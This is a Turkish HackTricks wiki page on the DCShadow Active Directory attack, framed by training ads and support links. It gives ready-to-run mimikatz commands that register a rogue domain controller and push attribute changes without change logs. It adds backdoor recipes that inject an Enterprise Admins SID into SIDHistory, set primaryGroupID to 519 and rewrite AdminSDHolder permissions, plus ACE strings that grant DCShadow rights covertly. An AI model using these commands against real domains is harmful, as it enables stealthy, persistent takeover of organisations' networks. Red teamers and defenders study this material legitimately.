{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}


# DCShadow

AD'de **yeni bir Domain Controller** kaydeder ve belirtilen nesnelerde **değişiklikler** ile ilgili herhangi bir **log** bırakmadan **atributları** (SIDHistory, SPNs...) **itmek** için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde olmanız gerekir.\
Yanlış veri kullanırsanız, oldukça kötü loglar görünecektir.

Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız var. Bunlardan biri, burada gerçekleştirmek istediğiniz değişiklikleri belirtmeniz gereken SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacak, diğeri ise değerleri itmek için kullanılacaktır:

{% code title="mimikatz1 (RPC sunucuları)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA veya benzeri gerektirir" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`**'ın `mimikatz1` oturumunda çalışmayacağını unutmayın, çünkü bu iş parçacığının ayrıcalıklarını yükseltti, ancak **işlemin ayrıcalığını** yükseltmemiz gerekiyor.\
Ayrıca bir "LDAP" nesnesi seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA'dan veya bu minimum izinlere sahip bir kullanıcıdan gönderebilirsiniz:

* **alan nesnesinde**:
* _DS-Install-Replica_ (Alan içinde Replica Ekle/Kaldır)
* _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönet)
* _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
* **Yapılandırma konteynerindeki** **Siteler nesnesi** (ve çocukları):
* _CreateChild and DeleteChild_
* **DC olarak kaydedilen** **bilgisayar nesnesi**:
* _WriteProperty_ (Yazma Değil)
* **hedef nesne**:
* _WriteProperty_ (Yazma Değil)

Bu ayrıcalıkları ayrıcalıksız bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bu bazı günlükler bırakacaktır). Bu, DA ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Bu, _**mcorp-student1**_ makinesinde oturum açtığında _**student1**_ kullanıcı adının _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.

## DCShadow Kullanarak Arka Kapılar Oluşturma

{% code title="SIDHistory'de Enterprise Admins'i bir kullanıcıya ayarlama" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="PrimaryGroupID'yi Değiştir (kullanıcıyı Alan Yöneticileri üyesi yap)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder'ın ntSecurityDescriptor'ını Değiştir (bir kullanıcıya Tam Kontrol Ver)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow izinlerini DCShadow kullanarak verin (değiştirilmiş izin günlükleri yok)

Aşağıdaki ACE'leri kullanıcının SID'si ile birlikte eklememiz gerekiyor:

* Alan nesnesinde:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Saldırgan bilgisayar nesnesinde: `(A;;WP;;;UserSID)`
* Hedef kullanıcı nesnesinde: `(A;;WP;;;UserSID)`
* Yapılandırma konteynerindeki Siteler nesnesinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Bu durumda **birden fazla değişiklik** yapmanız gerektiğini unutmayın, sadece bir tane değil. Bu nedenle, **mimikatz1 oturumu** (RPC sunucusu) içinde yapmak istediğiniz her değişiklik için **`/stack`** parametresini kullanın. Bu şekilde, tüm sıkışmış değişiklikleri sahte sunucuda gerçekleştirmek için yalnızca bir kez **`/push`** yapmanız gerekecek.



[**DCShadow hakkında daha fazla bilgi için ired.team'i ziyaret edin.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
